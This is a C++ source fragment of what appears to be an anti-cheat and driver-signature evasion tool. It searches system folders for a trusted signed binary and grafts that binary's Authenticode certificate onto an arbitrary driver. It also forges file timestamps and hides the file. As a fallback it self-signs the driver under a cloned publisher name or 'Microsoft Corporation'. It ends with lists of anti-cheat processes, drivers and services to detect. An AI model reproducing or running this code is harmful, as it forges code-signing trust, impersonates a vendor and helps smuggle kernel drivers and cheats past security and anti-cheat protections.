                                    score += 25;
                                }

                                PCERT_EXTENSION pExt = CertFindExtension(
                                    szOID_CERT_POLICIES,
                                    cert->pCertInfo->cExtension,
                                    cert->pCertInfo->rgExtension);
                                if (pExt) {
                                    CERT_POLICIES_INFO* polInfo = nullptr;
                                    DWORD cbDecoded = 0;
                                    if (CryptDecodeObjectEx(
                                        X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                                        X509_CERT_POLICIES,
                                        pExt->Value.pbData,
                                        pExt->Value.cbData,
                                        CRYPT_DECODE_ALLOC_FLAG,
                                        nullptr,
                                        &polInfo,
                                        &cbDecoded) && polInfo) {
                                        for (DWORD p = 0; p < polInfo->cPolicyInfo; p++) {
                                            for (int oid = 0; oid < sizeof(g_EVPolicyOIDs) / sizeof(g_EVPolicyOIDs[0]); oid++) {
                                                if (strcmp(polInfo->rgPolicyInfo[p].pszPolicyIdentifier, g_EVPolicyOIDs[oid]) == 0) {
                                                    score += 1000;
                                                }
                                            }
                                        }
                                        LocalFree(polInfo);
                                    }
                                }
                            }
                        }

                        if (sgnr->pChainContext->cChain > 0) {
                            CERT_SIMPLE_CHAIN* leafChain = sgnr->pChainContext->rgpChain[0];
                            if (leafChain->cElement > 0) {
                                PCCERT_CONTEXT leafCert = leafChain->rgpElement[0]->pCertContext;
                                SYSTEMTIME st;
                                FileTimeToSystemTime(&leafCert->pCertInfo->NotAfter, &st);
                                if (st.wYear >= 2027) score += 200;
                                else if (st.wYear >= 2026) score += 150;
                                else if (st.wYear >= 2025) score += 100;
                                else if (st.wYear >= 2024) score += 50;
                            }
                        }
                    }
                }
            }
        }

        trustData.dwStateAction = WTD_STATEACTION_CLOSE;
        WinVerifyTrust(NULL, &actionGUID, &trustData);

        return score;
    }

    static DWORD ComputePEChecksum(BYTE* peData, DWORD peSize) {
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peData;
        PIMAGE_NT_HEADERS ntBase = (PIMAGE_NT_HEADERS)(peData + dos->e_lfanew);

        DWORD checksumFieldOffset;
        if (ntBase->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
            checksumFieldOffset = (DWORD)((BYTE*)&((PIMAGE_NT_HEADERS64)ntBase)->OptionalHeader.CheckSum - peData);
        } else {
            checksumFieldOffset = (DWORD)((BYTE*)&((PIMAGE_NT_HEADERS32)ntBase)->OptionalHeader.CheckSum - peData);
        }

        DWORD csWord1 = checksumFieldOffset / 2;
        DWORD csWord2 = csWord1 + 1;
        DWORD wordCount = peSize / 2;
        USHORT* ptr = (USHORT*)peData;

        ULONGLONG sum = 0;
        for (DWORD i = 0; i < wordCount; i++) {
            if (i == csWord1 || i == csWord2) continue;
            sum += ptr[i];
            sum = (sum & 0xFFFF) + (sum >> 16);
        }

        if (peSize & 1) {
            sum += peData[peSize - 1];
            sum = (sum & 0xFFFF) + (sum >> 16);
        }

        sum = (sum & 0xFFFF) + (sum >> 16);
        sum += peSize;

        return (DWORD)sum;
    }

    static BOOL ScanDirectoryForSignedDriver(LPCWSTR directory, LPCWSTR pattern,
        WCHAR* outPath, SIZE_T outChars, BOOL* outIsEV, int* pBestScore) {
        WCHAR searchPattern[MAX_PATH];
        wcscpy_s(searchPattern, directory);
        wcscat_s(searchPattern, L"\\");
        wcscat_s(searchPattern, pattern);

        WIN32_FIND_DATAW fd;
        HANDLE hFind = FindFirstFileW(searchPattern, &fd);
        if (hFind == INVALID_HANDLE_VALUE) return FALSE;

        BOOL foundBetter = FALSE;

        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            if (fd.nFileSizeLow < 8192) continue;

            WCHAR fullPath[MAX_PATH];
            wcscpy_s(fullPath, directory);
            wcscat_s(fullPath, L"\\");
            wcscat_s(fullPath, fd.cFileName);

            HANDLE hFile = CreateFileW(fullPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr, OPEN_EXISTING, 0, nullptr);
            if (hFile == INVALID_HANDLE_VALUE) continue;

            BYTE hdrBuf[4096];
            DWORD br = 0;
            BOOL readOk = ReadFile(hFile, hdrBuf, sizeof(hdrBuf), &br, nullptr);
            CloseHandle(hFile);

            if (!readOk || br < sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS64)) continue;

            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hdrBuf;
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
            if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > br) continue;

            PIMAGE_NT_HEADERS ntHdrScan = (PIMAGE_NT_HEADERS)(hdrBuf + dos->e_lfanew);
            if (ntHdrScan->Signature != IMAGE_NT_SIGNATURE) continue;

            IMAGE_DATA_DIRECTORY secDir = {};
            if (ntHdrScan->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
                PIMAGE_NT_HEADERS64 nt64s = (PIMAGE_NT_HEADERS64)ntHdrScan;
                if (nt64s->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) continue;
                secDir = nt64s->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
            } else if (ntHdrScan->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
                PIMAGE_NT_HEADERS32 nt32s = (PIMAGE_NT_HEADERS32)ntHdrScan;
                if (nt32s->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) continue;
                secDir = nt32s->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
            } else {
                continue;
            }
            if (secDir.VirtualAddress == 0 || secDir.Size < 128) continue;

            int fileScore = ScoreDriverCertificate(fullPath);
            if (fileScore > *pBestScore) {
                *pBestScore = fileScore;
                wcscpy_s(outPath, outChars, fullPath);
                *outIsEV = (fileScore >= 1000);
                foundBetter = TRUE;

                if (fileScore >= 1000) break;
            }

        } while (FindNextFileW(hFind, &fd));

        FindClose(hFind);
        return foundBetter;
    }

    static void ScanDirectoryRecursive(LPCWSTR directory, LPCWSTR pattern,
        WCHAR* outPath, SIZE_T outChars, BOOL* outIsEV, int* pBestScore, int maxDepth) {
        if (maxDepth <= 0 || *pBestScore >= 1000) return;

        ScanDirectoryForSignedDriver(directory, pattern, outPath, outChars, outIsEV, pBestScore);
        if (*pBestScore >= 1000) return;

        WCHAR searchPath[MAX_PATH];
        if (wcslen(directory) + 3 >= MAX_PATH) return;
        wcscpy_s(searchPath, directory);
        wcscat_s(searchPath, L"\\*");

        WIN32_FIND_DATAW fd;
        HANDLE hFind = FindFirstFileW(searchPath, &fd);
        if (hFind == INVALID_HANDLE_VALUE) return;

        do {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;

            WCHAR subDir[MAX_PATH];
            if (wcslen(directory) + wcslen(fd.cFileName) + 2 >= MAX_PATH) continue;
            wcscpy_s(subDir, directory);
            wcscat_s(subDir, L"\\");
            wcscat_s(subDir, fd.cFileName);

            ScanDirectoryRecursive(subDir, pattern, outPath, outChars, outIsEV, pBestScore, maxDepth - 1);

            if (*pBestScore >= 1000) break;
        } while (FindNextFileW(hFind, &fd));

        FindClose(hFind);
    }

    static BOOL FindSignedDonorDriver(WCHAR* outPath, SIZE_T outChars, BOOL* outIsEV) {
        *outIsEV = FALSE;
        int bestScore = 0;

        WCHAR driversDir[MAX_PATH];
        GetSystemDirectoryW(driversDir, MAX_PATH);
        wcscat_s(driversDir, L"\\drivers");

        ScanDirectoryForSignedDriver(driversDir, L"*.sys", outPath, outChars, outIsEV, &bestScore);

        if (bestScore < 1000) {
            WCHAR sys32Dir[MAX_PATH];
            GetSystemDirectoryW(sys32Dir, MAX_PATH);
            ScanDirectoryForSignedDriver(sys32Dir, L"*.sys", outPath, outChars, outIsEV, &bestScore);
        }

        if (bestScore < 1000) {
            WCHAR sys32Dir[MAX_PATH];
            GetSystemDirectoryW(sys32Dir, MAX_PATH);
            ScanDirectoryForSignedDriver(sys32Dir, L"*.dll", outPath, outChars, outIsEV, &bestScore);
        }

        if (bestScore < 1000) {
            WCHAR sys32Dir[MAX_PATH];
            GetSystemDirectoryW(sys32Dir, MAX_PATH);
            ScanDirectoryForSignedDriver(sys32Dir, L"*.exe", outPath, outChars, outIsEV, &bestScore);
        }

        if (bestScore < 1000) {
            WCHAR sysWow64Dir[MAX_PATH];
            GetWindowsDirectoryW(sysWow64Dir, MAX_PATH);
            wcscat_s(sysWow64Dir, L"\\SysWOW64");
            ScanDirectoryForSignedDriver(sysWow64Dir, L"*.dll", outPath, outChars, outIsEV, &bestScore);
        }

        if (bestScore < 1000) {
            WCHAR driverStoreDir[MAX_PATH];
            GetWindowsDirectoryW(driverStoreDir, MAX_PATH);
            wcscat_s(driverStoreDir, L"\\System32\\DriverStore\\FileRepository");
            ScanDirectoryRecursive(driverStoreDir, L"*.sys", outPath, outChars, outIsEV, &bestScore, 2);
        }

        if (bestScore < 1000) {
            WCHAR programFilesDir[MAX_PATH];
            if (GetEnvironmentVariableW(L"ProgramFiles", programFilesDir, MAX_PATH)) {
                ScanDirectoryRecursive(programFilesDir, L"*.exe", outPath, outChars, outIsEV, &bestScore, 3);
                if (bestScore < 1000) {
                    ScanDirectoryRecursive(programFilesDir, L"*.dll", outPath, outChars, outIsEV, &bestScore, 3);
                }
            }
        }

        if (bestScore < 1000) {
            WCHAR programFilesX86Dir[MAX_PATH];
            if (GetEnvironmentVariableW(L"ProgramFiles(x86)", programFilesX86Dir, MAX_PATH)) {
                ScanDirectoryRecursive(programFilesX86Dir, L"*.exe", outPath, outChars, outIsEV, &bestScore, 3);
                if (bestScore < 1000) {
                    ScanDirectoryRecursive(programFilesX86Dir, L"*.dll", outPath, outChars, outIsEV, &bestScore, 3);
                }
            }
        }

        if (bestScore < 1000) {
            WCHAR commonFilesDir[MAX_PATH];
            if (GetEnvironmentVariableW(L"CommonProgramFiles", commonFilesDir, MAX_PATH)) {
                ScanDirectoryRecursive(commonFilesDir, L"*.dll", outPath, outChars, outIsEV, &bestScore, 3);
            }
        }

        if (bestScore < 1000) {
            WCHAR commonFilesX86Dir[MAX_PATH];
            if (GetEnvironmentVariableW(L"CommonProgramFiles(x86)", commonFilesX86Dir, MAX_PATH)) {
                ScanDirectoryRecursive(commonFilesX86Dir, L"*.dll", outPath, outChars, outIsEV, &bestScore, 3);
            }
        }

        return (bestScore > 0);
    }

    BOOL TransplantCertificateToDriver(LPCWSTR targetDriverPath) {
        printf("[*] Scanning system for signed donor driver...\n");

        WCHAR donorPath[MAX_PATH] = {};
        BOOL isEV = FALSE;

        if (!FindSignedDonorDriver(donorPath, MAX_PATH, &isEV)) {
            printf("[-] No signed donor driver found on system\n");
            return FALSE;
        }

        printf("[+] Selected donor: %ws (%s)\n", donorPath, isEV ? "EV-signed" : "signed");

        CERT_BUFFER certBuf = {};
        if (!ExtractCertificateData(donorPath, &certBuf)) {
            printf("[-] Failed to extract certificate from donor\n");
            return FALSE;
        }

        printf("[+] Extracted certificate (%lu bytes)\n", certBuf.Size);

        DWORD donorTimeDateStamp = 0;
        FILETIME donorCreation = {}, donorLastWrite = {}, donorLastAccess = {};
        {
            HANDLE hDonor = CreateFileW(donorPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hDonor != INVALID_HANDLE_VALUE) {
                GetFileTime(hDonor, &donorCreation, &donorLastAccess, &donorLastWrite);
                BYTE donorHdr[4096];
                DWORD donorBr = 0;
                if (ReadFile(hDonor, donorHdr, sizeof(donorHdr), &donorBr, nullptr) &&
                    donorBr >= sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS64)) {
                    PIMAGE_DOS_HEADER dDos = (PIMAGE_DOS_HEADER)donorHdr;
                    if (dDos->e_magic == IMAGE_DOS_SIGNATURE &&
                        (DWORD)dDos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) <= donorBr) {
                        PIMAGE_NT_HEADERS dNt = (PIMAGE_NT_HEADERS)(donorHdr + dDos->e_lfanew);
                        if (dNt->Signature == IMAGE_NT_SIGNATURE) {
                            donorTimeDateStamp = dNt->FileHeader.TimeDateStamp;
                        }
                    }
                }
                CloseHandle(hDonor);
            }
        }

        HANDLE hTarget = CreateFileW(targetDriverPath, GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hTarget == INVALID_HANDLE_VALUE) {
            printf("[-] Failed to open target driver for reading (err=%lu)\n", GetLastError());
            VirtualFree(certBuf.Data, 0, MEM_RELEASE);
            return FALSE;
        }

        DWORD targetFileSize = GetFileSize(hTarget, nullptr);
        if (targetFileSize == INVALID_FILE_SIZE || targetFileSize < 4096) {
            CloseHandle(hTarget);
            VirtualFree(certBuf.Data, 0, MEM_RELEASE);
            return FALSE;
        }

        DWORD certOffset = (targetFileSize + 7) & ~7UL;
        DWORD finalSize = certOffset + certBuf.Size;

        BYTE* finalData = (BYTE*)VirtualAlloc(nullptr, finalSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!finalData) {
            CloseHandle(hTarget);
            VirtualFree(certBuf.Data, 0, MEM_RELEASE);
            return FALSE;
        }

        DWORD bytesRead = 0;
        if (!ReadFile(hTarget, finalData, targetFileSize, &bytesRead, nullptr) || bytesRead != targetFileSize) {
            CloseHandle(hTarget);
            VirtualFree(finalData, 0, MEM_RELEASE);
            VirtualFree(certBuf.Data, 0, MEM_RELEASE);
            return FALSE;
        }
        CloseHandle(hTarget);

        PIMAGE_DOS_HEADER targetDos = (PIMAGE_DOS_HEADER)finalData;
        if (targetDos->e_magic != IMAGE_DOS_SIGNATURE) {
            VirtualFree(finalData, 0, MEM_RELEASE);
            VirtualFree(certBuf.Data, 0, MEM_RELEASE);
            return FALSE;
        }

        PIMAGE_NT_HEADERS64 targetNt = (PIMAGE_NT_HEADERS64)(finalData + targetDos->e_lfanew);
        if (targetNt->Signature != IMAGE_NT_SIGNATURE) {
            VirtualFree(finalData, 0, MEM_RELEASE);
            VirtualFree(certBuf.Data, 0, MEM_RELEASE);
            return FALSE;
        }

        if (donorTimeDateStamp != 0) {
            targetNt->FileHeader.TimeDateStamp = donorTimeDateStamp;
        }

        targetNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = certOffset;
        targetNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = certBuf.Size;
        targetNt->OptionalHeader.CheckSum = 0;

        if (certOffset > targetFileSize) {
            memset(finalData + targetFileSize, 0, certOffset - targetFileSize);
        }

        memcpy(finalData + certOffset, certBuf.Data, certBuf.Size);
        VirtualFree(certBuf.Data, 0, MEM_RELEASE);

        DWORD checksum = ComputePEChecksum(finalData, finalSize);
        targetNt->OptionalHeader.CheckSum = checksum;

        HANDLE hWrite = CreateFileW(targetDriverPath, GENERIC_WRITE, 0,
            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY, nullptr);
        if (hWrite == INVALID_HANDLE_VALUE) {
            VirtualFree(finalData, 0, MEM_RELEASE);
            return FALSE;
        }

        DWORD written = 0;
        BOOL writeOk = WriteFile(hWrite, finalData, finalSize, &written, nullptr);
        FlushFileBuffers(hWrite);
        if (donorCreation.dwHighDateTime != 0 || donorCreation.dwLowDateTime != 0) {
            SetFileTime(hWrite, &donorCreation, &donorLastAccess, &donorLastWrite);
        }
        CloseHandle(hWrite);
        VirtualFree(finalData, 0, MEM_RELEASE);

        if (!writeOk || written != finalSize) {
            return FALSE;
        }

        printf("[+] Certificate transplanted to target driver (%s)\n", isEV ? "EV" : "standard");
        return TRUE;
    }


#ifndef CALG_SHA_256
#define CALG_SHA_256 0x0000800c
#endif


    struct SS_FILE_INFO      { DWORD cbSize; LPCWSTR pwszFileName; HANDLE hFile; };
    struct SS_SUBJECT_INFO   { DWORD cbSize; DWORD* pdwIndex; DWORD dwSubjectChoice; SS_FILE_INFO* pFileInfo; };
    struct SS_CERT_STORE_INFO{ DWORD cbSize; PCCERT_CONTEXT pSigningCert; DWORD dwCertPolicy; HCERTSTORE hCertStore; };
    struct SS_CERT           { DWORD cbSize; DWORD dwCertChoice; SS_CERT_STORE_INFO* pStoreInfo; HWND hwnd; };
    struct SS_SIGNATURE_INFO { DWORD cbSize; ALG_ID algidHash; DWORD dwAttrChoice; void* pAttrAuthcode;
                               PCRYPT_ATTRIBUTES psAuth; PCRYPT_ATTRIBUTES psUnauth; };

    typedef HRESULT(WINAPI* pfnSignerSign)(SS_SUBJECT_INFO*, SS_CERT*, SS_SIGNATURE_INFO*,
                                           void*, LPCWSTR, PCRYPT_ATTRIBUTES, LPVOID);

    BOOL SelfSignDriver(LPCWSTR targetDriverPath) {
        printf("[*] Self-signing driver with Authenticode...\n");

        HMODULE hMssign = LoadLibraryW(L"mssign32.dll");
        if (!hMssign) {
            printf("[-] mssign32.dll not available\n");
            return FALSE;
        }

        auto pSign = (pfnSignerSign)GetProcAddress(hMssign, "SignerSign");
        if (!pSign) {
            printf("[-] SignerSign export not found\n");
            FreeLibrary(hMssign);
            return FALSE;
        }


        WCHAR donorPath[MAX_PATH] = {};
        BOOL isEV = FALSE;
        CERT_NAME_BLOB subjectBlob = {};
        BYTE* pAllocSubject = nullptr;

        if (FindSignedDonorDriver(donorPath, MAX_PATH, &isEV) && donorPath[0]) {
            printf("[+] Donor: %ws (%s)\n", donorPath, isEV ? "EV" : "standard");

            WINTRUST_FILE_INFO wfi = {};
            wfi.cbStruct = sizeof(wfi);
            wfi.pcwszFilePath = donorPath;

            GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;
            WINTRUST_DATA wtd = {};
            wtd.cbStruct = sizeof(wtd);
            wtd.dwUIChoice = WTD_UI_NONE;
            wtd.fdwRevocationChecks = WTD_REVOKE_NONE;
            wtd.dwUnionChoice = WTD_CHOICE_FILE;
            wtd.pFile = &wfi;
            wtd.dwStateAction = WTD_STATEACTION_VERIFY;
            wtd.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;

            WinVerifyTrust(NULL, &actionGUID, &wtd);

            if (wtd.hWVTStateData) {
                CRYPT_PROVIDER_DATA* prov = WTHelperProvDataFromStateData(wtd.hWVTStateData);
                if (prov) {
                    CRYPT_PROVIDER_SGNR* sgnr = WTHelperGetProvSignerFromChain(prov, 0, FALSE, 0);
                    if (sgnr && sgnr->pChainContext && sgnr->pChainContext->cChain > 0) {
                        CERT_SIMPLE_CHAIN* chain = sgnr->pChainContext->rgpChain[0];
                        if (chain->cElement > 0) {
                            PCCERT_CONTEXT donorCert = chain->rgpElement[0]->pCertContext;
                            char displayName[256] = {};
                            CertNameToStrA(X509_ASN_ENCODING, &donorCert->pCertInfo->Subject,
                                           CERT_X500_NAME_STR, displayName, sizeof(displayName));
                            printf("[+] Cloning publisher: %s\n", displayName);

                            DWORD cb = donorCert->pCertInfo->Subject.cbData;
                            pAllocSubject = (BYTE*)LocalAlloc(LPTR, cb);
                            if (pAllocSubject) {
                                memcpy(pAllocSubject, donorCert->pCertInfo->Subject.pbData, cb);
                                subjectBlob.pbData = pAllocSubject;
                                subjectBlob.cbData = cb;
                            }
                        }
                    }
                }
            }

            wtd.dwStateAction = WTD_STATEACTION_CLOSE;
            WinVerifyTrust(NULL, &actionGUID, &wtd);
        }


        if (!subjectBlob.pbData) {
            LPCSTR fallback = "CN=Microsoft Windows, O=Microsoft Corporation";
            DWORD cbEnc = 0;
            CertStrToNameA(X509_ASN_ENCODING, fallback, CERT_X500_NAME_STR, NULL, NULL, &cbEnc, NULL);
            if (cbEnc > 0) {
                pAllocSubject = (BYTE*)LocalAlloc(LPTR, cbEnc);
                if (pAllocSubject) {
                    CertStrToNameA(X509_ASN_ENCODING, fallback, CERT_X500_NAME_STR, NULL, pAllocSubject, &cbEnc, NULL);
                    subjectBlob.pbData = pAllocSubject;
                    subjectBlob.cbData = cbEnc;
                }
            }
        }

        if (!subjectBlob.pbData) {
            FreeLibrary(hMssign);
            return FALSE;
        }


        WCHAR container[64];
        swprintf_s(container, L"WM_%llu", __rdtsc());

        HCRYPTPROV hProv = 0;
        if (!CryptAcquireContextW(&hProv, container, NULL, PROV_RSA_FULL, CRYPT_NEWKEYSET)) {
            printf("[-] CryptAcquireContext: %lu\n", GetLastError());
            LocalFree(pAllocSubject);
            FreeLibrary(hMssign);
            return FALSE;
        }

        HCRYPTKEY hKey = 0;
        if (!CryptGenKey(hProv, AT_SIGNATURE, (2048 << 16) | CRYPT_EXPORTABLE, &hKey)) {
            printf("[-] CryptGenKey: %lu\n", GetLastError());
            CryptReleaseContext(hProv, 0);
            { HCRYPTPROV hDel = 0; CryptAcquireContextW(&hDel, container, NULL, PROV_RSA_FULL, CRYPT_DELETEKEYSET); }
            LocalFree(pAllocSubject);
            FreeLibrary(hMssign);
            return FALSE;
        }


        char ekuOidBuf[] = "1.3.6.1.5.5.7.3.3";
        LPSTR ekuOid = ekuOidBuf;
        CERT_ENHKEY_USAGE enhKU = {};
        enhKU.cUsageIdentifier = 1;
        enhKU.rgpszUsageIdentifier = &ekuOid;

        BYTE ekuEncoded[256] = {};
        DWORD ekuLen = sizeof(ekuEncoded);
        if (!CryptEncodeObjectEx(X509_ASN_ENCODING, X509_ENHANCED_KEY_USAGE, &enhKU, 0, NULL, ekuEncoded, &ekuLen)) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            { HCRYPTPROV hDel = 0; CryptAcquireContextW(&hDel, container, NULL, PROV_RSA_FULL, CRYPT_DELETEKEYSET); }
            LocalFree(pAllocSubject);
            FreeLibrary(hMssign);
            return FALSE;
        }

        char ekuExtOid[] = "2.5.29.37";
        CERT_EXTENSION ext = {};
        ext.pszObjId = ekuExtOid;
        ext.fCritical = FALSE;
        ext.Value.cbData = ekuLen;
        ext.Value.pbData = ekuEncoded;

        CERT_EXTENSIONS exts = {};
        exts.cExtension = 1;
        exts.rgExtension = &ext;

        CRYPT_KEY_PROV_INFO kpi = {};
        kpi.pwszContainerName = container;
        kpi.dwProvType = PROV_RSA_FULL;
        kpi.dwKeySpec = AT_SIGNATURE;

        SYSTEMTIME stEnd = {};
        GetSystemTime(&stEnd);
        stEnd.wYear += 10;

        PCCERT_CONTEXT pCert = CertCreateSelfSignCertificate(
            hProv, &subjectBlob, 0, &kpi, NULL, NULL, &stEnd, &exts);

        LocalFree(pAllocSubject);
        pAllocSubject = nullptr;

        if (!pCert) {
            printf("[-] CertCreateSelfSignCertificate: %lu\n", GetLastError());
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            { HCRYPTPROV hDel = 0; CryptAcquireContextW(&hDel, container, NULL, PROV_RSA_FULL, CRYPT_DELETEKEYSET); }
            FreeLibrary(hMssign);
            return FALSE;
        }


        HCERTSTORE hStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, 0, NULL);
        if (!hStore) {
            CertFreeCertificateContext(pCert);
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            { HCRYPTPROV hDel = 0; CryptAcquireContextW(&hDel, container, NULL, PROV_RSA_FULL, CRYPT_DELETEKEYSET); }
            FreeLibrary(hMssign);
            return FALSE;
        }

        PCCERT_CONTEXT pStoreCert = NULL;
        CertAddCertificateContextToStore(hStore, pCert, CERT_STORE_ADD_ALWAYS, &pStoreCert);
        CertSetCertificateContextProperty(pStoreCert, CERT_KEY_PROV_INFO_PROP_ID, 0, &kpi);


        SS_FILE_INFO       fi  = { sizeof(fi), targetDriverPath, NULL };
        DWORD              idx = 0;
        SS_SUBJECT_INFO    si  = { sizeof(si), &idx, 1 , &fi };
        SS_CERT_STORE_INFO csi = { sizeof(csi), pStoreCert, 2 , NULL };
        SS_CERT            sc  = { sizeof(sc), 2 , &csi, NULL };
        SS_SIGNATURE_INFO  ssi = { sizeof(ssi), CALG_SHA_256, 0 , NULL, NULL, NULL };

        HRESULT hr = pSign(&si, &sc, &ssi, NULL, NULL, NULL, NULL);


        if (pStoreCert) CertFreeCertificateContext(pStoreCert);
        CertFreeCertificateContext(pCert);
        CertCloseStore(hStore, 0);
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        { HCRYPTPROV hDel = 0; CryptAcquireContextW(&hDel, container, NULL, PROV_RSA_FULL, CRYPT_DELETEKEYSET); }
        FreeLibrary(hMssign);

        if (FAILED(hr)) {
            printf("[-] SignerSign failed: 0x%08X\n", hr);
            return FALSE;
        }


        if (donorPath[0]) {
            HANDLE hDonor = CreateFileW(donorPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hDonor != INVALID_HANDLE_VALUE) {
                FILETIME ftCreate, ftAccess, ftWrite;
                if (GetFileTime(hDonor, &ftCreate, &ftAccess, &ftWrite)) {
                    CloseHandle(hDonor);
                    HANDLE hTarget = CreateFileW(targetDriverPath, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ,
                        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                    if (hTarget != INVALID_HANDLE_VALUE) {
                        SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite);
                        CloseHandle(hTarget);
                    }
                } else {
                    CloseHandle(hDonor);
                }
            }
        }

        printf("[+] Driver self-signed (SHA-256 Authenticode)\n");
        return TRUE;
    }
}
const wchar_t* SignedMemory::g_AntiCheatProcesses[] = {
    L"BEService.exe",
    L"BEService_x64.exe",
    L"EasyAntiCheat.exe",
    L"EasyAntiCheat_EOS.exe",
    L"EasyAntiCheat_Setup.exe",
    L"EasyAntiCheat_EOS_Setup.exe",
    L"vgk.exe",
    L"vgtray.exe",
    L"faceitclient.exe",
    L"faceit_service.exe",
    L"eseaservice.exe",
    L"nprotect.exe",
    L"GameMon.des",
    L"TslGame_BE.exe",
    L"PnkBstrA.exe",
    L"PnkBstrB.exe",
    L"mracsvc.exe",
    L"equ8_helper.exe",
    L"SGuardSvc64.exe",
    L"SGuardSvc.exe",
    L"ACEHelper.exe"
};

const int SignedMemory::g_AntiCheatProcessesCount = sizeof(SignedMemory::g_AntiCheatProcesses) / sizeof(SignedMemory::g_AntiCheatProcesses[0]);

const wchar_t* SignedMemory::g_AntiCheatDrivers[] = {
    L"BEDaisy.sys",
    L"bedaisy.sys",
    L"EasyAntiCheat.sys",
    L"EasyAntiCheat_EOS.sys",
    L"vgk.sys",
    L"RandGrid.sys",
    L"FACEIT.sys",
    L"esea.sys",
    L"eseadriver2.sys",
    L"xhunter1.sys",
    L"xkqd.sys",
    L"npgg.sys",
    L"nprobes.sys",
    L"mhyprot2.sys",
    L"HoYoKProtect.sys",
    L"ACE-BASE.sys",
    L"ACE-Guard.sys",
    L"TesSafe.sys",
    L"aow_drv_x64_ev.sys",
    L"PnkBstrK.sys",
    L"mrac.sys",
    L"mrac1.sys",
    L"Lionic.sys",
    L"atc.sys",
    L"BadlionAnticheat.sys",
    L"navagio.sys",
    L"uncheater.sys",
    L"Saber.sys",
    L"ricochet.sys",
    L"EQU8_HELPER_63.sys"
};

const int SignedMemory::g_AntiCheatDriversCount = sizeof(SignedMemory::g_AntiCheatDrivers) / sizeof(SignedMemory::g_AntiCheatDrivers[0]);

const wchar_t* SignedMemory::g_AntiCheatServices[] = {
    L"BEService",
    L"BEDaisy",
    L"EasyAntiCheat",
    L"EasyAntiCheat_EOS",
    L"vgk",
    L"vgkbootstatus",
    L"FaceItService",
    L"ESEAService2",
    L"PnkBstrA",
    L"PnkBstrB",
    L"mhyprot2",
    L"HoYoKProtect",
    L"ACE-BASE",
    L"ACE-Guard",
    L"TesSafe",
    L"mrac",
    L"EQU8_HELPER"
};

const int SignedMemory::g_AntiCheatServicesCount = sizeof(SignedMemory::g_AntiCheatServices) / sizeof(SignedMemory::g_AntiCheatServices[0]);
